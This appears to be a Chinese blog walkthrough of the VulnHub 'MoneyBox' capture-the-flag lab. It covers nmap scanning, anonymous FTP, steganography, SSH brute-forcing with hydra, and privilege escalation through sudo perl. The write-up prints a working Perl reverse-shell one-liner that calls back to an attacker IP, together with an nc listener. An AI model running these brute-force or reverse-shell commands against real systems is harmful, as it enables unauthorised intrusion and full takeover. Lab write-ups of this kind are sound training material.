# 打靶-MoneyBox

## 0x00 准备工作

靶场目标获取3个flag，难度简单。在vulnhub上下载靶机的ovf文件，先用VMware部署，发现访问不到靶机的ip，更换VirtualBox部署，关闭usb设备，网络设置为同一个NAT网络，即可。

## 0x01 flag1

通过二层扫描（arp-scan）同网段的存活IP，使用`arp-scan -I eth0 -l`， `-I 网卡 -l 本地网络`，找到靶机的ip为10.0.2.15<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-64.png" alt="" class="wp-image-3689" width="699" height="134" /> </figure> 

使用`nmap -p- 10.0.2.15`扫描所有端口。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-66.png" alt="" class="wp-image-3691" width="557" height="176" /> </figure> 

对这些端口进行服务识别，sV：版本检测是用来扫描目标主机和端口上运行的软件的版本。`nmap -p21,22,80 -sV 10.0.2.15`。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-67.png" alt="" class="wp-image-3692" width="652" height="214" /> </figure> 

使用`nmap -p21 -sC 10.0.2.15`，sC：根据端口识别服务自动调用默认脚本。扫描发现，存在FTP匿名登录的漏洞。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-68.png" alt="" class="wp-image-3693" width="608" height="417" /> </figure> 

SSH和HTTP服务无异常。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-69.png" alt="" class="wp-image-3694" width="595" height="444" /> </figure> 

FTP连接，以Anonymous登录，密码为空，查看当前目录下的文件，发现有trytofind.jpg文件，可能隐藏信息，get到本机上。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-70.png" alt="" class="wp-image-3696" width="639" height="359" /> </figure> 

图片没有明显的信息<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-72.png" alt="" class="wp-image-3698" width="551" height="414" /> </figure> 

SSH服务可能需要暴力破解，渗透前期不推荐，看80端口的网页，web服务和源代码也没有啥信息，但提示不需要想得太复杂。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-71.png" alt="" class="wp-image-3697" width="438" height="423" /> </figure> 

使用dirsearch扫描下目录，发现有一个响应码为301 的/blogs目录。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-73.png" alt="" class="wp-image-3700" width="590" height="301" /> </figure> 

浏览器访问，网页信息显示已经被黑掉了，有一个hint。<figure class="wp-block-image size-full">

<img loading="lazy" width="1006" height="207" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-74.png" alt="" class="wp-image-3701" /> </figure> 

查看源代码，发现有个隐藏文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="781" height="27" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-75.png" alt="" class="wp-image-3702" /> </figure> 

访问文件，在源代码里面放了密钥。<figure class="wp-block-image size-full">

<img loading="lazy" width="364" height="30" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-76.png" alt="" class="wp-image-3703" /> </figure> 

通过strings命令发现图片中存在异常字符。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-77.png" alt="" class="wp-image-3704" width="480" height="179" /> </figure> 

用steghide提取隐藏信息，输入之前获取的密钥，确实存在data.txt。<figure class="wp-block-image size-full">

<img loading="lazy" width="568" height="215" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-78.png" alt="" class="wp-image-3705" /> </figure> 

使用`steghide extract -sf trytofind.jpg`，提取信息。发现存在一个用户renu，密码很弱。<figure class="wp-block-image size-full">

<img loading="lazy" width="968" height="179" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-79.png" alt="" class="wp-image-3706" /> </figure> 

ssh字典爆破一下，先建立一个user.txt，`echo renu > user.txt`，再找一个密码字典。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-80.png" alt="" class="wp-image-3708" width="508" height="38" /> </figure> 

用nmap的ssh爆破脚本，运行一段时间后，没有响应了。

<pre class="wp-block-code"><code>nmap --script ssh-brute --script-args userdb=user.txt,passdb=rockyou.txt 10.0.2.15</code></pre>

更换hydra

<pre class="wp-block-code"><code>hydra -l renu -P rockyou.txt 10.0.2.15 ssh</code></pre>

顺利找到密码<figure class="wp-block-image size-full">

<img loading="lazy" width="1098" height="380" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-81.png" alt="" class="wp-image-3709" /> </figure> 

ssh登录<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-82.png" alt="" class="wp-image-3710" width="691" height="399" /> </figure> 

## 0x02 flag2 

尝试sudo到root用户，由于不属于超级用户组，没有足够的权限。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-83.png" alt="" class="wp-image-3712" width="642" height="59" /> </figure> 

查看历史命令，home目录下有lily目录，而home 目录用于存放用户文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="150" height="66" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-85.png" alt="" class="wp-image-3716" /> </figure> 

切换到对应目录，得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="445" height="189" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-86.png" alt="" class="wp-image-3718" /> </figure> 

## 0x03 flag3

回到之前的history，发现renu把自己生成的ssh的密钥拷贝到了192.168.43.80的lily账号下，怀疑可以通过公钥身份认证登录到lily账号上。<figure class="wp-block-image size-full">

<img loading="lazy" width="433" height="311" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-84.png" alt="" class="wp-image-3715" /> </figure> 

查看在.ssh里查看公钥和私钥文件,lily的authorized_keys存在renu的公钥。<figure class="wp-block-image size-full">

<img loading="lazy" width="1104" height="365" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-87.png" alt="" class="wp-image-3719" /> </figure> 

因此renu可以直接通过ssh登陆到lily账号。<figure class="wp-block-image size-full">

<img loading="lazy" width="832" height="333" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-88.png" alt="" class="wp-image-3720" /> </figure> 

继续查看history，发现`sudo -l`命令经常出现。显示出自己（执行 sudo 的使用者）的权限，lily用户可以在不需要密码的情况下使用Perl程序。<figure class="wp-block-image size-full">

<img loading="lazy" width="932" height="171" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-89.png" alt="" class="wp-image-3722" /> </figure> 

可以利用perl编写反弹shell的脚本

```
sudo perl -e 'use Socket;$i="10.0.2.4";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

在kali上监听2333端口

<pre class="wp-block-code"><code>nc -nvlp 2333

-g&lt;网关>   设置路由器跃程通信网关，最丢哦可设置8个。
-G&lt;指向器数目>   设置来源路由指向器，其数值为4的倍数。
-h   在线帮助。
-i&lt;延迟秒数>   设置时间间隔，以便传送信息及扫描通信端口。
-l   使用监听模式，管控传入的资料。
-n   直接使用IP地址，而不通过域名服务器。
-o&lt;输出文件>   指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
-p&lt;通信端口>   设置本地主机使用的通信端口。
-r   乱数指定本地与远端主机的通信端口。
-s&lt;来源位址>   设置本地主机送出数据包的IP地址。
-u   使用UDP传输协议。
-v   显示指令执行过程。
-w&lt;超时秒数>   设置等待连线的时间。
-z   使用0输入/输出模式，只在扫描通信端口时使用。</code></pre>

连接成功，获得root权限<figure class="wp-block-image size-full">

<img loading="lazy" width="1049" height="148" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-90.png" alt="" class="wp-image-3725" /> </figure> 

进入root根目录，发现隐藏的.root.txt文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="1082" height="780" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-91.png" alt="" class="wp-image-3726" /> </figure>
